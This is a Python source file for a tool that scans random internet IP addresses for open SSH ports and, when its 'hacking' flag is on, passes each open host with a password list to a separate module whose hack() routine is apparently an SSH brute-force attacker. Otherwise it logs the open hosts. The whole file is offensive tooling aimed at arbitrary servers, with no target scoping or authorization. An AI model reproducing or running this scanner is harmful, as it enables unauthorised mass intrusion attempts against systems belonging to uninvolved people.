from random import randint
from core.lydia import Lydia
from termcolor import colored
import _thread
import socket


class LydiaScanner:

    def __init__(self, verbose, logfilepath):
        pass

    def __init__(self, verbose, passlistpath, logfilepath, hacking):
        self.verbose = verbose
        self.passlistpath = passlistpath
        self.logfilepath = logfilepath
        self.hacking = hacking

    def go(self, threads):
        for i in range(0, threads):
            try:
                _thread.start_new_thread(self.thread, (str(i),))
            except Exception as e:
                print("Error: unable to start thread " + str(i))
                print(e)
        while (True):
            pass

    def generateIp(self):
        return str(randint(1, 255)) + "." + str(randint(1, 255)) + "." + str(randint(1, 255)) + "." + str(
            randint(1, 255))

    def checkForSSH(self, ip):
        a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        a_socket.settimeout(3)
        location = (ip, 22)
        result_of_check = a_socket.connect_ex(location)
        a_socket.close()

        if result_of_check == 0:
            return True
        else:
            return False

    def thread(self, threadnr):
        while True:
            ip = self.generateIp()
            if self.verbose:
                print("[" + colored("Thread " + threadnr, "red") + "][" + colored("INFO",
                                                                                  "cyan") + "] Checking wether " + ip + " has open port 22")
            if self.checkForSSH(ip) and self.hacking:
                l = Lydia(ip, threadnr, self.passlistpath, self.logfilepath)
                l.hack()
            elif self.checkForSSH(ip):
                logfile = open(self.logfilepath, "a", encoding='utf-8', errors='ignore')
                logfile.write(ip + "\n")
